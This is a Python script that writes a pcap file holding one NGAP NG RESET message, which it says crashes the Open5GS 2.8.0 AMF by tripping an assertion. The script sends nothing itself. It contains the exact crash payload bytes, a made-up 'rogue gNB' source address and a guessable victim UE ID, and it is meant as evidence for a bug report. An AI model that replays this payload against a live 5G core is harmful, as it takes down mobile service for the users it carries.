"""Generate a Wireshark-openable pcap of the single NGAP NG RESET datagram that
crashes the Open5GS 2.8.0 AMF (assertion `gnb->ng_reset_ack`, nsmf-handler.c:928).

This does NOT send anything and touches no network — it frames the exact APER
bytes our builder emits (deterministic, verified against the live AMF) into
Ethernet/IPv4/SCTP with PPID=60 (NGAP), so the resulting file dissects as
`NGAP / NGReset / partOfNG-Interface` in Wireshark/tshark. Attach it to the issue.

    python make_ngreset_pcap.py            # -> evidence/crash-ngreset/ngreset.pcap

The payload equals `builders.ng_reset_partial([(VICTIM_AMF_UE_NGAP_ID, 99)])`;
edit VICTIM below to match a live victim id if you want the bytes to line up with
your own AMF log.
"""
from __future__ import annotations

import os
import struct

# ---- exact NGAP APER payload (NGReset, ResetType=partOfNG-Interface, 1 UE) ----
# Reproduce from the builder to stay in sync (falls back to the literal bytes).
VICTIM = 2          # victim AMF-UE-NGAP-ID (small, enumerable)
ATTACKER_RAN_UE = 99
try:
    from ngaptester import builders as B, ngap
    NGAP_BYTES = ngap.encode(B.ng_reset_partial([(VICTIM, ATTACKER_RAN_UE)]))
except Exception:
    # NGReset / Cause=om-intervention / partOfNG-Interface {AMF-UE-NGAP-ID=2, RAN-UE-NGAP-ID=99}
    NGAP_BYTES = bytes.fromhex("00140012000002000f40018600580006400160020063")

SRC_IP = "172.30.200.9"   # rogue gNB (attacker)
DST_IP = "172.30.0.10"    # AMF N2
SPORT = 38412
DPORT = 38412
NGAP_PPID = 60


# ---- CRC32c (Castagnoli), as SCTP requires (RFC 3309) ----
def _crc32c(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ (0x82F63B78 & -(crc & 1))
    return crc ^ 0xFFFFFFFF


def _sctp_data_packet(payload: bytes) -> bytes:
    # DATA chunk: type=0, flags=B|E(0x03), TSN, stream 0, PPID
    pad = (-len(payload)) % 4
    chunk = struct.pack("!BBH", 0x00, 0x03, 16 + len(payload)) + \
        struct.pack("!IHHI", 1, 0, 0, NGAP_PPID) + payload + b"\x00" * pad
    # common header: sport, dport, vtag, checksum(0 for calc)
    common = struct.pack("!HHII", SPORT, DPORT, 0x1234ABCD, 0)
    pkt = common + chunk
    csum = _crc32c(pkt)
    # checksum stored little-endian in the field (RFC 3309)
    return common[:8] + struct.pack("<I", csum) + chunk


def _ipv4(payload: bytes) -> bytes:
    def ip2b(s): return bytes(int(x) for x in s.split("."))
    total = 20 + len(payload)
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, 0x0001, 0x4000,
                      64, 132, 0, ip2b(SRC_IP), ip2b(DST_IP))  # proto 132 = SCTP
    # IP header checksum
    s = sum(struct.unpack("!10H", hdr))
    s = (s >> 16) + (s & 0xFFFF); s += (s >> 16)
    hdr = hdr[:10] + struct.pack("!H", (~s) & 0xFFFF) + hdr[12:]
    return hdr + payload


def _ethernet(payload: bytes) -> bytes:
    dst = bytes.fromhex("020000000010")
    src = bytes.fromhex("0200000c8009")
    return dst + src + b"\x08\x00" + payload


def _pcap(frame: bytes) -> bytes:
    gh = struct.pack("!IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)  # EN10MB
    rec = struct.pack("!IIII", 0, 0, len(frame), len(frame))
    return gh + rec + frame


def main():
    frame = _ethernet(_ipv4(_sctp_data_packet(NGAP_BYTES)))
    out_dir = os.path.join("evidence", "crash-ngreset")
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, "ngreset.pcap")
    with open(path, "wb") as f:
        f.write(_pcap(frame))
    print(f"wrote {path} ({os.path.getsize(path)} bytes)")
    print(f"NGAP payload ({len(NGAP_BYTES)} bytes): {NGAP_BYTES.hex()}")
    print("open in Wireshark -> dissects as NGAP / NGReset / partOfNG-Interface")


if __name__ == "__main__":
    main()
